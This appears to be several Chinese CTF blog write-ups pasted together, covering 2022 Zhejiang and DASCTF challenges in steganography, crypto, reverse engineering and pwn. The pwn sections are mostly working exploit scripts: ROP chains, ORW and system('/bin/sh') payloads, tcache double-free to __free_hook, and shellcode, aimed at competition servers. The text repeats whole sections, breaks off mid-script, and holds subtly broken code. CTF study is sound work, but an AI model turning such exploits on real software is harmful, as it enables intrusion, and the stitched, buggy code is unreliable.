Post.title: 2022浙江省ctf决赛
Post._content:
# MISC

## checkin_gift

下载附件，是一张图片

放入kali中binwalk

![图片](2022浙江省ctf决赛/clip_image002.gif)

发现由两张图片拼接成，foremost分离

![图片](2022浙江省ctf决赛/clip_image004.gif)

分离出这样一张图片，找了一圈也没有啥线索，想起来可能会在两张图片之间放些东西，把原图拖进winhex看看，搜索JFIF

![图片](2022浙江省ctf决赛/clip_image006.gif)

![图片](2022浙江省ctf决赛/clip_image008.gif)

发现了一串加密字符串，用CyberChef解密

经过尝试，rot13->base64->base32解密得到flag

![图片](2022浙江省ctf决赛/clip_image010.gif)

DASCTF{38392d8bfe3196fc0fd29bcb14fdaceb}

 

 

m4a

下载附件，发现是一个名为m4a的无后缀文件

首先想到的就是拖进winhex看看

![图片](2022浙江省ctf决赛/clip_image012.gif)

发现了翻转的16进制文件，复制16进制数值到随波逐流：其他工具->Hex_str翻转

就能得到压缩包的16进制格式了

![图片](2022浙江省ctf决赛/clip_image014.gif)

复制内容，用winhex新建出文件放入数据导出为压缩包

![图片](2022浙江省ctf决赛/clip_image016.gif)

打开是atbash.txt，但是压缩包损坏，原因是我们把这个文件的16进制都倒过来了，这里只需要压缩包的那一部分就好，不过可以直接WinRAR修复压缩包

发现需要密码，回到m4a文件，m4a一般是音频的后缀，加上m4a后缀试试

能听出是morse密码，放入au

![图片](2022浙江省ctf决赛/clip_image018.gif)

能直接根据长短敲出摩斯码-... .- ....- ..-- -... -.-. . ..-. -.-. ..--- ----- ....-

解码得BA43BCEFC204，应该是压缩包密码了,得到(+w)v&LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN

应该是加密字符串，根据文件名atbash提示，rot47->atbash Cipher

![图片](2022浙江省ctf决赛/clip_image020.gif)

得到flag，DASCTF{5e0f98a95f79829b7a484a54066cb08f}

 

## Unkn0wnData

下载附件，发现是一张png图片

![图片](2022浙江省ctf决赛/clip_image022.gif)

在010中发现图片16进制尾有一大串有规律的字符，CyberChef解码知道是emoji

![图片](2022浙江省ctf决赛/clip_image024.gif)

这里看0rays战队的wp学到了新东西，还可以直接爆破，如下

![图片](2022浙江省ctf决赛/clip_image026.gif)

得到emoji：

🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍍🎤🐘🌏ℹ⌨😍🎈✉🤣🛩🍌🚪🍴ℹ☺🚹❓🍴🔬🌪🍵👣🔄☃👌😎👌🔄👌🔪🍌👁🍍🍌🌏🎃🚰🍵🐍🎅✅🍍🦓😎😊🤣🏹🍍💧🔄🔄🤣👁🥋🚫☺🍴😁🚫😇🚰⏩😍🌿💵🦓😇🛩✖🕹🐎📂📂💧🗒🗒

要找个key进行aes解密，再去看看图片的lsb

![图片](2022浙江省ctf决赛/clip_image028.gif)

zsteg可以发现有压缩包，但是这里可以看的到并不全，于是用stegsolve找找

RGB0通道找到了该压缩包![图片](2022浙江省ctf决赛/clip_image030.gif)

winhex导出来

![图片](2022浙江省ctf决赛/clip_image032.gif)

 保存为压缩包，解压出来一个key.txt，里面是data块

![图片](2022浙江省ctf决赛/clip_image034.gif)

用脚本转换一下

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

 

shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

 

keys = open('key.txt')

output = ""

for line in keys:

  k = line[1]

  n = line[4:6]

  if k == '0':

​     print(normalKeys[n], end='')

  elif k == '2':

​     print(shiftKeys[n], end='')

得到：

mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d<DEL>

把<DEL>的前面一位删除

mimimashiFindTheRealKeyandMakeIt!

但是发现并不是真正的key，真正的key是刚好被删掉的几个字符，能通过前面三位的k、e、y发现

得到key:Toggled

通过aes-emoji解密可得

![图片](2022浙江省ctf决赛/clip_image036.gif)

DASCTF{ad15eecd2978bc5c70597d14985412c4}

 

# WEB

## Web4

测试后发现题目将空格过滤了

使用内连注释符绕过

最后发现flag在emails表中

   ![image-20220926183506725](2022浙江省ctf决赛/image-20220926183506725.png)                            

 

## Web 3

随机种子数是时间戳，我们可以利用本地环境提前预知时间戳为种子后，数找到组中对应函数存放的位置，然后一直刷新，在对应的时间戳处获得flag

 ![image-20220926183515680](2022浙江省ctf决赛/image-20220926183515680.png)



# RE

## ezandroid

逆向后mainactivity如下图所示

![image-20220924140508630](2022浙江省ctf决赛/image-20220924140508630.png)

可以看到账号密码输入成功后进入afterlog

afterlog如下图所示

![image-20220924140552062](2022浙江省ctf决赛/image-20220924140552062.png)

就放了一个视图，然后进入这个视图

![image-20220924140630237](2022浙江省ctf决赛/image-20220924140630237.png)

可以看到背景是一张图片，最后加压缩出图片可以看到flag

![image-20220924140722575](2022浙江省ctf决赛/image-20220924140722575.png)



# PWN

## GO-MAZE-v4

走完地图发现输出的是假flag，但是后门还是存在一个出入点，于是输入大量垃圾数据，发现程序崩溃，所以猜测存在栈溢出漏洞，然后静态分析

![clip_image002](2022浙江省ctf决赛/clip_image002.png)

这里其实给了提示，v14这个参数存在溢出，然后就是构造rop链打orw。

exp：

```
from pwn import *
from time import *
context.log_level='debug'
#p=process('./pwn')
p=remote('1.14.97.218', 26200)
elf=ELF('./pwn')

poprax=0x400a4f
syscall=0x4025ab
poprdi=0x4008f6
poprsi=0x40416f
poprdx=0x51d4b6
poprbx=0x402498
popdxsi=0x51d559
buf=0x98a000
leave=0x4015cb

rop=b''
rop=p64(poprdi)+p64(0)+p64(popdxsi)+p64(0x100)+p64(buf+0x300)+p64(syscall)+p64(leave)

payload=p64(0)+p64(poprax)+p64(2)+p64(poprdi)+p64(elf.search(b'flag').__next__())+p64(poprsi)+p64(0)+p64(syscall)
payload+=p64(poprax)+p64(0)+p64(poprdi)+p64(3)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)
payload+=p64(poprax)+p64(1)+p64(poprdi)+p64(1)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)

def maps():
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'w')
    p.sendline(b'w')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'w')

def pwn():
    p.recvuntil('flag')
    p.sendline(b'a'*0x178+p64(buf+0x300)+rop)
    p.send(payload)

maps()
pwn()
p.interactive()
```

可以看到账号密码输入成功后进入afterlog

afterlog如下图所示

# PWN

## GO-MAZE-v4

走完地图发现输出的是假flag，但是后门还是存在一个出入点，于是输入大量垃圾数据，发现程序崩溃，所以猜测存在栈溢出漏洞，然后静态分析

![clip_image002](2022浙江省ctf决赛/clip_image002.png)

这里其实给了提示，v14这个参数存在溢出，然后就是构造rop链打orw。

exp：

```
from pwn import *
from time import *
context.log_level='debug'
#p=process('./pwn')
p=remote('1.14.97.218', 26200)
elf=ELF('./pwn')

poprax=0x400a4f
syscall=0x4025ab
poprdi=0x4008f6
poprsi=0x40416f
poprdx=0x51d4b6
poprbx=0x402498
popdxsi=0x51d559
buf=0x98a000
leave=0x4015cb

rop=b''
rop=p64(poprdi)+p64(0)+p64(popdxsi)+p64(0x100)+p64(buf+0x300)+p64(syscall)+p64(leave)

payload=p64(0)+p64(poprax)+p64(2)+p64(poprdi)+p64(elf.search(b'flag').__next__())+p64(poprsi)+p64(0)+p64(syscall)
payload+=p64(poprax)+p64(0)+p64(poprdi)+p64(3)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)
payload+=p64(poprax)+p64(1)+p64(poprdi)+p64(1)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)

def maps():
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b's')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'w')
    p.sendline(b'w')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'd')
    p.sendline(b'w')
    p.sendline(b'w')

def pwn():
    p.recvuntil('flag')
    p.sendline(b'a'*0x178+p64(buf+0x300)+rop)
    p.send(payload)

maps()
pwn()
p.interactive()
```

Post.title: 2022DASCTF七月赋能赛
Post._content:
# WEB

## Ez to getflag 题

发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询/flag，获得flag

![img](2022DASCTF赋能赛/clip_image002.png)

![image-20220724185704918](2022DASCTF赋能赛/image-20220724185704918.png)



# crypto

## babysign

本题使用椭圆曲线数字签名算法，由题意得secret由flag生成，所以需要通过加密方式反推求secret（即k）的公式

已知：s=![img](2022DASCTF赋能赛/clip_image002-16587282944209.gif) * (m + n*r) (mod gen)

则：k=![img](2022DASCTF赋能赛/clip_image004-165872829442010.gif) *(s*n-m) (mod gen)

**EXP**

```python
import hashlib
import gmpy2
from ecdsa.ecdsa import *
import ecdsa
from Crypto.Util.number import *

R=0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5
S=0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c
msg=b'welcome to ecdsa'
n=57872441580840888721108499129165088876046881204464784483281653404168342111855
gen = ecdsa.NIST256p.generator.order()
m= int(hashlib.sha256(msg).hexdigest(), 16)
k= ((S*n-m)*gmpy2.invert(R,gen)) % gen
print(long_to_bytes(k))
```



## easyNTRU

本题的考点是NTRU，由于e和h为多项式且项数均为10项并不多，所以可以考虑采用爆破的方法解出m

**EXP**

```python
from Crypto.Hash import SHA3_256
from Crypto.Cipher import AES
import sys
from Crypto.Util.Padding import unpad

N = 10
p = 3
q = 512
d = 3
R.<x> = ZZ[]
c=b'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@}U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'
Num = [-1, 0, 1]
for i1 in Num:
    for i2 in Num:
       for i3 in Num:
          for i4 in Num:
              for i5 in Num:
                 for i6 in Num:
                    for i7 in Num:
                       for i8 in Num:
                          for i9 in Num:
                             for i10 in Num:
                                 result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]
                                 m = R(result)
                                 sha3 = SHA3_256.new()
                                 Key = sha3.update(bytes(str(m).encode('utf-8'))).digest()
                                 dypher = AES.new(key, AES.MODE_ECB)
                                 try:
                                    flag = unpad(dypher.decrypt(c), 32)
                                    if  flag.startswith(b'DASCTF'):
                                          print(flag)
                                          sys.exit(0)
                                  except:
                                     pass

```



# pwn

## eyfor题

![image-20220724183747873](2022DASCTF赋能赛/image-20220724183747873.png)

上图中的代码存在负数绕过，导致可以向`nbytes`中写入任意长度的内容造成栈溢出。

将“/bin/sh”写入`nbytes`中，通过`strncpy()`复制到`buf`中。

![image-20220724184142775](2022DASCTF赋能赛/image-20220724184142775.png)

`buf`在bss段上，函数也提供了`_system`，所以可以让`buf`作为`_system`参数。

**EXP**

```python
from pwn import *
io = remote('node4.buuoj.cn', 27055)
#io = process('./pwn4')
elf = ELF('./pwn4')
context.log_level = "debug"
ret = 0x400915
pop_rdi = 0x0400983
io.recv()
io.send(b'1')

io.recv()
io.sendline(b'1')
io.recv()
io.sendline(b'2')
io.recv()
io.sendline(b'3')
io.recv()
io.sendline(b'4')

io.sendline(b'-1')
#io.recv()
payload = b'/bin/sh\x00'.ljust(0x38, b'a') + p64(ret) + p64(pop_rdi) +  p64(0x06010C0)+ p64(elf.symbols["system"])
#gdb.attach(io)
#pause()
io.sendline(payload)
io.interactive()
```



## MyCanary2题

![image-20220724184707602](2022DASCTF赋能赛/image-20220724184707602.png)

分析上诉代码可知，按case1、case2、case3的执行顺序即可绕过`if`的判断，并且case1存在栈溢出漏洞。



![image-20220724184900448](2022DASCTF赋能赛/image-20220724184900448.png)

程序存在`_system`和`/bin/sh`，可以覆盖返回地址并调用执行`system(/bin/sh)`获得shell



**EXP**

```python
from pwn import *

io = process('./MyCanary2')
#io = remote('node4.buuoj.cn', 28231)
elf = ELF('./MyCanary2')
system_plt = elf.symbols["system"]
pop_rdi = 0x0401613
ret = 0x040101a

io.recvuntil('Input your choice\n')
io.sendline(b'1')
payload = b'a'*0x6c + p32(0) + b'a'*8 + p64(pop_rdi) + p64(0x04020F0) + p64(system_plt)
io.recvuntil('Show me the code:\n')
io.send(payload)
gdb.attach(io)
pause()
io.recvuntil('Input your choice\n')
io.sendline(b'2')
io.recvuntil(b'But now, I have a new Secret.')
io.recvuntil('Input your choice\n')
io.sendline(b'3')

io.interactive()
```

## 哆来咪发唆拉西哆

首先得到一个pdf，binwalk后有个zip，解压后有个txt

![图片](2022DASCTF赋能赛/clip_image024.gif)

发现这应该是圆周率的后面的位数

![图片](2022DASCTF赋能赛/clip_image026.gif)

![图片](2022DASCTF赋能赛/clip_image028.gif)

![图片](2022DASCTF赋能赛/clip_image030.gif)

![图片](2022DASCTF赋能赛/clip_image032.gif)

前一组都是255而后一组数都是211，根据数组的特性用脚本将数组转化

```python
import re

 

pi='3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360............'

with open('whatisthis.txt','rb')as f:

  lines=f.readlines()

for line in lines:

  line=str(line,encoding='utf-8',errors='strict')

  a = []

  a = re.findall("\d+\.?\d*", line)

  list=[]

  for i in range(len(a)):

   s=int(a[i])

   list.append(pi[s:s+3:])

  str_dec=''

  for i in range(0,len(list[1])):

   s= list[0][i]

   if list[0][i]==list[1][i] and list[0][i]==list[2][i] and list[0][i]==list[3][i]:

​     str_dec+=s

  str_hex=hex(int(str_dec))

  str_hex=str_hex[2:4:]

  if len(str_hex)==1:

   str_hex='0'+str_hex

  print(str_hex,end='')
```

![图片](2022DASCTF赋能赛/clip_image036.gif)

 

转化后得到一张图片，保存后发现

![图片](2022DASCTF赋能赛/clip_image038.jpg)

flag是10000后缺失的30个数字

# crypto

## babysign

本题使用椭圆曲线数字签名算法，由题意得secret由flag生成，所以需要通过加密方式反推求secret（即k）的公式

已知：s=![img](2022DASCTF赋能赛/clip_image002-16587282944209.gif) * (m + n*r) (mod gen)

则：k=![img](2022DASCTF赋能赛/clip_image004-165872829442010.gif) *(s*n-m) (mod gen)

**EXP**

```python
import hashlib
import gmpy2
from ecdsa.ecdsa import *
import ecdsa
from Crypto.Util.number import *

R=0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5
S=0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c
msg=b'welcome to ecdsa'
n=57872441580840888721108499129165088876046881204464784483281653404168342111855
gen = ecdsa.NIST256p.generator.order()
m= int(hashlib.sha256(msg).hexdigest(), 16)
k= ((S*n-m)*gmpy2.invert(R,gen)) % gen
print(long_to_bytes(k))
```



## easyNTRU

本题的考点是NTRU，由于e和h为多项式且项数均为10项并不多，所以可以考虑采用爆破的方法解出m

**EXP**

```python
from Crypto.Hash import SHA3_256
from Crypto.Cipher import AES
import sys
from Crypto.Util.Padding import unpad

N = 10
p = 3
q = 512
d = 3
R.<x> = ZZ[]
c=b'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@}U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'
Num = [-1, 0, 1]
for i1 in Num:
    for i2 in Num:
       for i3 in Num:
          for i4 in Num:
              for i5 in Num:
                 for i6 in Num:
                    for i7 in Num:
                       for i8 in Num:
                          for i9 in Num:
                             for i10 in Num:
                                 result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]
                                 m = R(result)
                                 sha3 = SHA3_256.new()
                                 Key = sha3.update(bytes(str(m).encode('utf-8'))).digest()
                                 dypher = AES.new(key, AES.MODE_ECB)
                                 try:
                                    flag = unpad(dypher.decrypt(c), 32)
                                    if  flag.startswith(b'DASCTF'):
                                          print(flag)
                                          sys.exit(0)
                                  except:
                                     pass

```



# pwn

## eyfor题

![image-20220724183747873](2022DASCTF赋能赛/image-20220724183747873.png)

上图中的代码存在负数绕过，导致可以向`nbytes`中写入任意长度的内容造成栈溢出。

将“/bin/sh”写入`nbytes`中，通过`strncpy()`复制到`buf`中。

![image-20220724184142775](2022DASCTF赋能赛/image-20220724184142775.png)

`buf`在bss段上，函数也提供了`_system`，所以可以让`buf`作为`_system`参数。

**EXP**

```python
from pwn import *
io = remote('node4.buuoj.cn', 27055)
#io = process('./pwn4')
elf = ELF('./pwn4')
context.log_level = "debug"
ret = 0x400915
pop_rdi = 0x0400983
io.recv()
io.send(b'1')

io.recv()
io.sendline(b'1')
io.recv()
io.sendline(b'2')
io.recv()
io.sendline(b'3')
io.recv()
io.sendline(b'4')

io.sendline(b'-1')
#io.recv()
payload = b'/bin/sh\x00'.ljust(0x38, b'a') + p64(ret) + p64(pop_rdi) +  p64(0x06010C0)+ p64(elf.symbols["system"])
#gdb.attach(io)
#pause()
io.sendline(payload)
io.interactive()
```



## MyCanary2题

![image-20220724184707602](2022DASCTF赋能赛/image-20220724184707602.png)

分析上诉代码可知，按case1、case2、case3的执行顺序即可绕过`if`的判断，并且case1存在栈溢出漏洞。



![image-20220724184900448](2022DASCTF赋能赛/image-20220724184900448.png)

程序存在`_system`和`/bin/sh`，可以覆盖返回地址并调用执行`system(/bin/sh)`获得shell

```python
from pwn import *

io = process('./MyCanary2')
#io = remote('node4.buuoj.cn', 28231)

system_plt = elf.symbols["system"]
pop_rdi = 0x0401613
ret = 0x040101a

io.recvuntil('Input your choice\n')
io.sendline(b'1')
payload = b'a'*0x6c + p32(0) + b'a'*8 + p64(pop_rdi) + p64(0x04020F0) + p64(system_plt)
io.recvuntil('Show me the code:\n')
io.send(payload)
gdb.attach(io)
pause()
io.recvuntil('Input your choice\n')
io.sendline(b'2')
io.recvuntil(b'But now, I have a new Secret.')
io.recvuntil('Input your choice\n')
io.sendline(b'3')

io.interactive()
```

发现这应该是圆周率的后面的位数

前一组都是255而后一组数都是211，根据数组的特性用脚本将数组转化

运行得到

............55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec593b15762c5d8abb15762aff00ffd9

转化后得到一张图片，保存后发现

flag是10000后缺失的30个数字

DASCTF{566722796619885782794848855834}

Post.title: 蓝帽杯初赛pwn1复现
Post._content:
# 题目简介

一道升级版的ret2shellcode



# 解题流程 

## 查看保护

![image-20220710224631699](/image-20220710224631699.png)



## 静态分析

### main()

![image-20220710224715244](/image-20220710224715244.png)

`init_io()`就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示



![image-20220710224957314](/image-20220710224957314.png)

可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。



### init_main()

![image-20220710225220354](/image-20220710225220354.png)

可以看到`heap_mem`这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。



![image-20220710225451610](/image-20220710225451610.png)



### init_flag()

![image-20220710225612172](/image-20220710225612172.png)

看到了不得了的东西，直接将flag写到了bss段上。



### go()

![image-20220710225729898](/image-20220710225729898.png)

因为`heap_mem`上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。



## 动态调试

首先运行一下程序

![image-20220710230113827](/image-20220710230113827.png)

在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在`init_mem()`中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。



![image-20220710230644865](/image-20220710230644865.png)

如上图所示，其实`ret heap_mem()`后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。



## 漏洞利用

经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。

==因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：==

在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。

![image-20220710231937873](/image-20220710231937873.png)

利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。



# EXP

```python
from pwn import*
context(arch='amd64',os='linux')
sh=process('./escape_shellcode')
#sh=remote("39.106.156.74",23470)
#start=0
start=0x500000000000
#addr=0x5633c143f000
code='''
    mov rdi,1
    mov rsi,{}
    mov r12,0xfffff0000000
    mov r15,0x1000#r15储存偏移
    mov rdx,0x1000#打印长度设置为0x1000
    mov rax,1
    syscall#write(rdi,rsi,rdx)
    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址
    and rsi,r12#丢弃后28位
    add rsi,r15#rsi=rsi+偏移地址
    add r15,0x1000#偏移递增0x1000
    jmp $-0x19#循环 跳转到mov rax，1 
'''.format(start)
payload=asm(code)
#gdb.attach(sh)
#pause()
sh.sendline(payload)
sh.recvuntil("flag{")
flag=b'flag{'+sh.recvuntil("}")
print(flag)
```



# 小结

其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。

Post.title: 2022浙江省ctf初赛
Post._content:
> [题目附件下载地址](https://github.com/Eu21ka/pwn-exercises/tree/main/2022浙江省赛)

 # PWN

## babyheap

这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。

**EXP：**

```python
from pwn import *
context.log_level='debug'
def conn(x,file_name):
    if x:
        p=process(file_name)
    else:
        p=remote('1.14.97.218',22785)
    return ELF(file_name),p,ELF('libc-2.27.so')
def choice(ch):
    p.sendlineafter('input your choice: ',str(ch))
def add(size):
    choice(1)
    p.sendlineafter('input size: ',str(size))
def edit(idx,payload):
    choice(2)
    p.sendlineafter('input index: ',str(idx))
    p.sendafter('input content: ',payload)
def show(idx):
    choice(3)
    p.sendlineafter('input index: ',str(idx))
def free(idx):
    choice(4)
    p.sendlineafter('input index: ',str(idx))
elf,p,libc=conn(0,'./pwn1')
add(0x68)#0
add(0x68)#1
free(0)
free(1)
show(1)
p.recvline()
heap=u64(p.recvline().replace(b'\n',b'')+b'\0\0')-0x260
success('heap:'+hex(heap))
edit(1,p64(heap+0x10))
add(0x68)#2
add(0x68)#3
add(0x7f)#4
add(0x28)#5
edit(3,b'\x00'*7+b'\x07')
free(4)
show(4)
libc_addr=u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')-96-0x10-
libc.sym['__malloc_hook']
success('libc:'+hex(libc_addr))
edit(3,b'a'*0x48+p64(libc_addr+libc.sym['__free_hook']))
add(0x28)#6
edit(6,p64(libc_addr+libc.sym['system']))
edit(0,'/bin/sh\0')
free(0)
gdb.attach(p)
p.interactive(
```

> 这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。



# RE

## ManyCheck

第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是`77`

![image-20220920204556151](2022浙江省ctf初赛/image-20220920204556151.png)

第二个检查根据问题敲敲计算器就可以计算出`55`和`49`两个答案，程序中的判断如下图所示

![image-20220920204745404](2022浙江省ctf初赛/image-20220920204745404.png)

第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断

![image-20220920204900834](2022浙江省ctf初赛/image-20220920204900834.png)

最后可以看到如下图所示的运算

![image-20220920205002693](2022浙江省ctf初赛/image-20220920205002693.png)

是循环移位，直接用python跑

```python
>>> x=1718896489
>>> (x>>16)+((x&(2**16-1))<<16)
1198089844
```



# MISC

## 好怪哦

下载附件，发现是个损坏的压缩包，用winhex打开看看

![图片](2022浙江省ctf初赛/clip_image002.gif)

发现是都翻转过的16进制，于是用随波逐流进行hex_str翻转

![图片](2022浙江省ctf初赛/clip_image004.gif)

复制翻转修复好的16进制码，在winhex中还原出新的压缩包

![图片](2022浙江省ctf初赛/clip_image006.gif)

保存好后打开压缩包，一张损坏的png图片，同样拉进winhex

发现缺少png文件头，89504E47给它补上

![图片](2022浙江省ctf初赛/clip_image008.gif)

![图片](2022浙江省ctf初赛/clip_image010.gif)

发现是一半的图片，修改高度得到flag

![图片](2022浙江省ctf初赛/clip_image012.gif)

![图片](2022浙江省ctf初赛/clip_image014.gif)

DASCTF{f8b275b06baf4204fa62743eab5eca98}



## 神奇的棋盘

下载附件

![图片](2022浙江省ctf初赛/clip_image016.gif)

![图片](2022浙江省ctf初赛/clip_image018.gif)

看了眼附件，应该是棋盘加密，拿原先的棋盘对比一下

![图片](2022浙江省ctf初赛/clip_image020.jpg)

对照替换

![图片](2022浙江省ctf初赛/clip_image022.jpg)

到这里没什么思路了，去看看给的图片有没有隐藏信息，因为是png，所以先想到的是lsb隐写

![图片](2022浙江省ctf初赛/clip_image024.jpg)

zsteg发现有段base32（stegsolve RGB0通道也可以解出），解出来是个key

![图片](2022浙江省ctf初赛/clip_image026.jpg)

LastKey{Yusayyds}

有了key直接随波逐流ADFGVX解密

![图片](2022浙江省ctf初赛/clip_image028.jpg)

明文进行16进制转换得到flag

![图片](2022浙江省ctf初赛/clip_image030.gif)

DASCTF{d859c41c530afc1c1ad94abd92f4baf8}



## segmentFlow

下载附件，八个加密文件

![图片](2022浙江省ctf初赛/clip_image032.gif)

文件大小都相同，CRC32爆破

![图片](2022浙江省ctf初赛/clip_image034.gif)

![图片](2022浙江省ctf初赛/clip_image036.gif)

![图片](2022浙江省ctf初赛/clip_image038.gif)

---
title: 2022浙江省ctf初赛
date: 2022-09-20 21:16:00
tags:
- pwn
- misc
- re
- web
categories:
- [比赛]

> [题目附件下载地址](https://github.com/Eu21ka/pwn-exercises/tree/main/2022浙江省赛)

 # PWN

## babyheap

这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。

**EXP：**

```python
from pwn import *
context.log_level='debug'
def conn(x,file_name):
    if x:
        p=process(file_name)
    else:
        p=remote('1.14.97.218',22785)
    return ELF(file_name),p,ELF('libc-2.27.so')
def choice(ch):
    p.sendlineafter('input your choice: ',str(ch))
def add(size):
    choice(1)
    p.sendlineafter('input size: ',str(size))
def edit(idx,payload):
    choice(2)
    p.sendlineafter('input index: ',str(idx))
    p.sendafter('input content: ',payload)
def show(idx):
    choice(3)
    p.sendlineafter('input index: ',str(idx))
def free(idx):
    choice(4)
    p.sendlineafter('input index: ',str(idx))
elf,p,libc=conn(0,'./pwn1')
add(0x68)#0
add(0x68)#1
free(0)
free(1)
show(1)
p.recvline()
